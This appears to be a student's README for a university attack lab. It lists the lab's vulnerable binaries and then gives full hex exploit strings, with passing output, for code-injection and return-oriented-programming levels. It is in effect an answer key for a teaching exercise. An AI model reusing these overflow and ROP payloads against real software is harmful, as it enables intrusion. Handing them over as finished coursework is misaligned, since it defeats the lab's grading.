******
Files:
******

This file contains materials for one instance of the attacklab.

Files:

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.


*********
My result
*********

ctarget level 1

./ctarget -q < ctarget_l1_raw.txt

Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab attacklab
    result  1:PASS:0xffffffff:ctarget:1:31 32 33 34 35 36 37 38 31 32 33 34 35 36 37 38 31 32 33 34 35 36 37 38 31 32 33 34 35 36 37 38 31 32 33 34 35 36 37 38 C0 17 40 

ctarget level 2

./ctarget -q < ctarget_l2_raw.txt 

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab attacklab
    result  1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 


ctarget level 3

./ctarget -q < ctarget_l3_raw.txt 

Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab attacklab
    result  1:PASS:0xffffffff:ctarget:3:68 FA 18 40 00 48 C7 C7 A8 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 


rtarget level 2

./rtarget -q < rtarget_l2_raw.txt 

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab attacklab
    result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 


rtarget level 3

./rtarget -q < rtarget_l3_raw.txt 

Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab attacklab
    result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 30 00 00 00 FF 7F 00 00 C5 19 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 42 1A 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
